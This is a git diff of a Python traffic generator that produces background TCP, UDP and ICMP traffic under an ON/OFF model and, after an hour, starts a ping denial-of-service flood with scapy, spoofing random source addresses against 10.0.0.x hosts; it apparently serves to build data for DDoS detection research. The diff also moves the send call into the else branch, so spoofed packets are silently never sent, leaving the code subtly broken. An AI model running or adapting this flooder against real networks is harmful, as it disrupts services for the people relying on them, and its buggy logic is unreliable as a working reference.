@@ -7,7 +7,7 @@ import socket
 import struct
 import array
 import logging
-import thread
+from threading import Thread
 from random import randint
 from scapy.all import *
 
@@ -24,7 +24,11 @@ UDP_server_ip = "10.0.0.10"
 UDP_server_port = 9012
 UDP_address = (UDP_server_ip, UDP_server_port)
 LOG_PATH = "/home/ajoy/Ajoy_data/ddos.log"
-
+# ON/OFF model param
+alpha_ON = 1.5
+alpha_OFF = 1.5
+beta_ON = 1
+beta_OFF = 1
 
 def init_log(log_path):
     # real_time = time.strftime('%Y-%m-%d-%H-%M-%S', time.localtime(time.time()))
@@ -127,42 +131,53 @@ def UDP_client():
     udp_socket.close()
     return send_bytes + recv_bytes
 
-
 def send_tcp(packet_num):
-    start_time = time.time()
-    for i in range(packet_num):
-	# generate TCP data
-        tcp_data_bytes = TCP_client()
-        print("TCP client send and receive bytes:%d" % tcp_data_bytes)
-        # sleep time in (1, 10)
-        t = random.randint(1, 10)
-	time.sleep(t)
+    all_send_packet = 0
+    while all_send_packet < packet_num:
+        u = random.uniform(0.0001, 1) # 产生(0,1)均匀分布
+        send_packet = int(beta_ON / (math.pow(u, 1 / alpha_ON)))
+        sleep_time = beta_OFF / (math.pow(u, 1 / alpha_OFF))
+        for i in range(send_packet):
+            # generate TCP data
+            tcp_data_bytes = TCP_client()
+            print("TCP client send and receive bytes:%d" % tcp_data_bytes)
+        time.sleep(sleep_time)
+        all_send_packet += send_packet
+        # 每次ON/OFF模型结束，休息2s
+        time.sleep(2)
 
 def send_udp(packet_num):
-    start_time = time.time()
-    for i in range(packet_num):
-	# generate UDP data
-        udp_data_bytes = UDP_client()
-        print("UDP client send and receive bytes:%d" % udp_data_bytes)
-	# sleep time in (150, 200)
-        t = random.randint(15, 20)
-	time.sleep(t * 10)
+    all_send_packet = 0
+    while all_send_packet < packet_num:
+        u = random.uniform(0.0001, 1) # 产生(0,1)均匀分布
+        send_packet = int(beta_ON / (math.pow(u, 1 / alpha_ON)))
+        sleep_time = beta_OFF / (math.pow(u, 1 / alpha_OFF))
+        for i in range(send_packet):
+            # generate UDP data
+            udp_data_bytes = UDP_client()
+            print("UDP client send and receive bytes:%d" % udp_data_bytes)
+        time.sleep(sleep_time)
+        all_send_packet += send_packet
+        time.sleep(40)
 
 def send_icmp(packet_num, host_num):
-    start_time = time.time()
-    ip_prefix = "10.0.0."
-    for i in range(packet_num):
-        # randomly select host ip
-        ip_host = random.randint(0, host_num)
-        host = ip_prefix + str(ip_host)
-        print("ping %s" % host)
-        ping = Pinger()
-        icmp_data_bytes = ping.sendPing(host)
-        print("ICMP send and receive bytes:%d" % icmp_data_bytes)
-        # sleep time in (9900-10000)
-	t = random.uniform(0.99, 1.0)
-        time.sleep(t * 10000)
-	# time.sleep(5)
+    all_send_packet = 0
+    while all_send_packet < packet_num:
+        u = random.uniform(0.0001, 1) # 产生(0,1)均匀分布
+        send_packet = int(beta_ON / (math.pow(u, 1 / alpha_ON)))
+        sleep_time = beta_OFF / (math.pow(u, 1 / alpha_OFF))
+        ip_prefix = "10.0.0."
+        for i in range(send_packet):
+            # randomly select host ip
+            ip_host = random.randint(0, host_num)
+            host = ip_prefix + str(ip_host)
+            print("ping %s" % host)
+            ping = Pinger()
+            icmp_data_bytes = ping.sendPing(host)
+            print("ICMP send and receive bytes:%d" % icmp_data_bytes)
+        time.sleep(sleep_time)
+        all_send_packet += send_packet
+        time.sleep(2000)
 
 def random_src_ip():
     ip_part1 = randint(1, 255)
@@ -180,20 +195,20 @@ def ping_sendone(host, random_source=True):
     id_ping = randint(1, 65535)
     seq_ping = randint(1, 65535)
     if random_source == True:
-	source_ip = random_src_ip()
-	packet = IP(src=source_ip, dst=host, ttl=64, id=id_ip) / ICMP(id=id_ping, seq=seq_ping) / b'welcome'*100
+        source_ip = random_src_ip()
+        packet = IP(src=source_ip, dst=host, ttl=64, id=id_ip) / ICMP(id=id_ping, seq=seq_ping) / b'welcome'*100
     else:
-	packet = IP(dst=host, ttl=64, id=id_ip) / ICMP(id=id_ping, seq=seq_ping) / b'welcome'*100
-    ping = send(packet, verbose=False)
+        packet = IP(dst=host, ttl=64, id=id_ip) / ICMP(id=id_ping, seq=seq_ping) / b'welcome'*100
+        ping = send(packet, verbose=False)
 
 def ping(host_num, packet_num, random_source=True):
     for i in range(packet_num):
-	host = random_dst_ip(host_num)
-	print("attacked host:%s" % host)
-	if random_source == True:
-	    ping_sendone(host)
-	else:
-	    ping_sendone(host, random_source=False)
+        host = random_dst_ip(host_num)
+        print("attacked host:%s" % host)
+        if random_source == True:
+            ping_sendone(host)
+        else:
+            ping_sendone(host, random_source=False)
 
     logger.info("ending ping attack.")
 
@@ -207,22 +222,19 @@ if __name__ == '__main__':
     t_icmp = Thread(target=send_icmp, args=(3, host_num))
     t_icmp.start()
 
-    t_ping1 = Thread(target=ping, args=(host_num, 500,))
+    t_ping1 = Thread(target=ping, args=(host_num, 1000,))
     t_ping2 = Thread(target=ping, args=(host_num, 500,))
-    # after 4hours generating normal data, begin attack 
-    time.sleep(15000)
+    # after 1hours generating normal data, begin attack
+    time.sleep(3600)
     logger.info("starting ping attack.")
     t_ping1.start()
     t_ping2.start()
 
     if not t_tcp.is_alive():
-	print("TCP packets are sending over.")
+        print("TCP packets are sending over.")
     if not t_udp.is_alive():
-	print("UDP packets are sending over.")
+        print("UDP packets are sending over.")
     if not t_icmp.is_alive():
-	print("ICMP packets are sending over.")
+        print("ICMP packets are sending over.")
     if not (t_ping1.is_alive() and t_ping2.is_alive()):
-	print("ping dos attact is over.")
-
-
-    
+        print("ping dos attact is over.")
